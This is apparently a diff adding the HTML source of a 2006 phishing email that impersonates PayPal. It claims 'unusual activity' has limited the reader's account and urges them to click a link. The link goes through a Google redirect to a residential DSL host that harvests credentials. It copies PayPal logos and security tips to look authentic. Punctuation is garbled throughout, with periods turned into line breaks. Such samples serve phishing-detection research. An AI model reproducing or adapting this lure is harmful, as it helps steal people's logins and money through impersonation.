@@ -1,0 +1,156 @@
+<head><title>Please Restore Your Account Access</title>
+<style type="text/css">#obmessage 
+dummy {}
+#z BODY, #z  TD {font-family: verdana,arial,helvetica,sans-serif;
+font-size:12px;color: #000000;}
+</style>
+</head>
+<span id=z>
+<xhtml>
+<table width=680 align=center>
+        <tr><td><A target="_blank"href="https://www
+paypal
+com/us"><IMG
+src="http://images
+paypal
+com/en_US/i/logo/email_logo
+gif" alt=PayPal border=0></A></td></tr>
+</table>
+<table width="100%" cellpadding=0>
+        <tr><td background="http://images
+paypal
+com/images/bg_clk
+gif" width=100%><img
+src="http://images
+paypal
+com/images/pixel
+gif"height=29 width=1 border=0></td></tr>
+</table>
+<br>
+<table align=center>
+        <tr>
+        <td width=450>
+        <table>
+                <tr><td>Dear PayPal Member,</td></tr>
+                <tr><td>PayPal is committed to maintaining a safe environment for its community of
+buyers and sellers
+ To protect the security of your account, PayPal employs
+some of the most advanced security systems in the world and our anti-fraud
+teams regularly screen the PayPal system for unusual activity
+<br><br>
+
+We are contacting you to remind you that on November 2, 2006 our Account
+Review Team identified some unusual activity in your account
+ In accordance
+with PayPal's User Agreement and to ensure that your account has not been
+compromised, access to your account was limited
+ Your account access will
+remain limited until this issue has been resolved
+<br><br>
+
+We would like to ensure that your account was not accessed by an
+unauthorized third party
+ Because protecting the security of your account
+is our primary concern, we have limited access to sensitive PayPal account
+features
+ We understand that this may be an inconvenience but please
+understand that this temporary limitation is for your protection
+<br><br>
+
+In order to secure your account and quickly restore full access, we may
+require some additional information from you
+
+<br><br> Login follow our secure site and update all necessary informations to your account
+<br><br>
+                <table width="80%" cellspacing=0 border=0 bgcolor="#FFE65C" align=left>
+                        <tr><td>
+                        <table width="100%" cellpadding=4 bgcolor="#FFFECD" align=center>
+                                <tr><td class="pp_sansserif" align=center><a target="_blank"
+href="http://www
+google
+com/url
+sa=X&oi=dict&q=http://adsl-71-130-140-50
+dsl
+irvnca
+pacbell
+net/Default
+htm">Click here to restore your account access</a></td></tr>
+                        </table>
+                        </td></tr>
+                </table>
+                <br><br><BR>Thank you for your prompt attention to this matter
+ Please understand that this is a security measure meant to help protect you and your account
+ We apologize for any inconvenience
+
+
+<br><br>Sincerely,
+<br>PayPal Account Review Department
+
+                </td></tr>
+                <tr><td><hr class=dotted></td></tr>
+                <tr><td>
+                <tr><td class="pp_footer">Please do not reply to this e-mail
+ Mail sent to this address cannot be
+answered
+ For assistance,
+            <a href="http://www
+google
+com/url
+sa=X&oi=dict&q=http://adsl-71-130-140-50
+dsl
+irvnca
+pacbell
+net/Default
+htm">log in</a> to your PayPal account and choose the "Help" link in the
+footer of any
+page
+<br></td></tr><tr><td><img src="http://images
+paypal
+com/en_US/i/scr/pixel
+gif" height=10 width=1
+border=0></td></tr>
+                <tr><td>PayPal Email ID PP2359</td></tr>
+                      <tr><td> Copyright© 2006, PayPal Inc
+, All rights reserved
+ Designated trademarks and brands are the property of their respective owners
+</td></tr>
+        </table>
+        </td>
+        <td width=190 valign=top>
+        <table cellspacing=0 cellpadding=1 bgcolor="#cccccc">
+                <td>
+                <table cellspacing=0 cellpadding=0 bgcolor="#ffffff">
+                        <tr><td>
+                        <table width="100%" cellpadding=5 bgcolor="#eeeeee">
+                                <tr><td align=center>Protect Your Account Info</td></tr>
+                        </table>
+                        <table cellpadding=5>
+                                <tr><td>Make sure you never provide your password to fraudulent websites
+<br><br>To
+safely and securely access the PayPal website or your account, open a new web browser (e
+g
+ Internet Explorer or
+Netscape) and type in the PayPal login page (http://paypal
+com/) to be sure you are on the real PayPal
+site
+<br><br>PayPal will never ask you to enter your password in an email
+<br><br>For more information on protecting
+yourself from fraud, please review our Security Tips at https://www
+paypal
+com/us/securitytips<br></td></tr>
+                        </table></td></tr>
+                        <tr><td>
+                        <table width="100%" cellpadding=5 bgcolor="#eeeeee">
+                                <tr><td align=center>Protect Your Password</td></tr>
+                        </table>
+                        <table cellpadding=5>
+                                <tr><td>You should never give your PayPal password to anyone
+<br></td></tr>
+                        </table>
+                        </td></tr>
+                </table>
+                </td></tr>
+        </table>
+        </td></tr>
+</table>
+</xhtml></span>
